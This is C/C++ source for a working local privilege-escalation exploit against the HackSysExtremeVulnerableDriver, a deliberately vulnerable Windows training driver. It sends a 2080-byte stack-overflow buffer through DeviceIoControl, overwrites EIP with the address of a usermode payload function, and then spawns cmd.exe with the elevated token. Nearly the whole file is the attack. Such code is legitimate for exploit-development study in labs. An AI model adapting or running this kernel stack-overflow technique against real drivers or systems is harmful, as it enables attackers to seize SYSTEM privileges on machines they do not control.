#include <stdio.h>
#include <Windows.h>

extern "C" void __stdcall payload(void);

int main()
{
	// Defining variables
	HANDLE driver;
	DWORD bytes_returned;
	// IOCTL opcode for the basic stack overflow
	int ioctl_opcode = 0x222003;
	// Saving the address of the payload function to an int so that can be passed to memcpy and copy the usermode address
	// of the payload to where eip will be overwritten
	int payloadAddy = (int)payload;
	// Offset before overwriting eip
	int eip_offset = 2080;
	// Good practice for DeviceIOControl
	char out[64];
	// Pointer to buffer storing payload
	char* buffer;

	printf("HEVD Stack Overflow Exploit\n");

	// Get a handle to the driver
	driver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d when opening handle to driver\n", GetLastError());
		Sleep(5000);
		return 0;
	}

	printf("[+] Opened handle to driver 0x%x\n", driver);

	// Make some room on the heap for our payload
	buffer = (char*)malloc(eip_offset + sizeof(int));
	if (buffer == 0)
	{
		printf("[-] Error %d when allocating memory for payload\n", GetLastError());
		CloseHandle(driver);
		return 0;
	}
	// Fill the buffer to the before eip and make eip equal to the usermode address of payload
	// (there is no SMEP on Windows 7 so you don't have to flip the cr4 bit)
	memset(buffer, '\x41', eip_offset);
	memcpy(buffer + strlen(buffer), &payloadAddy, sizeof(int));

	printf("[+] Payload buffer created at 0x%x\n", buffer);

	// Send the malformed payload to the driver
	if (!DeviceIoControl(driver, ioctl_opcode, buffer, eip_offset + sizeof(int), out, 64, &bytes_returned, 0))
	{
		printf("[-] Error %d when sending device IOCTL code\n", GetLastError());
		free(buffer);
		CloseHandle(driver);
		Sleep(5000);
		return 0;
	}

	// Go ahead and free unused pointers
	free(buffer);
	CloseHandle(driver);

	printf("[+] Payload sent!\nOpening shell\n");

	// Launch cmd.exe with our new system security token
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	memset(&startInfo, 0, sizeof(STARTUPINFOA));
	startInfo.cb = sizeof(STARTUPINFOA);

	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d when starting process\n", GetLastError());
		Sleep(5000);
	}
	else
	{
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}
	return 0;
}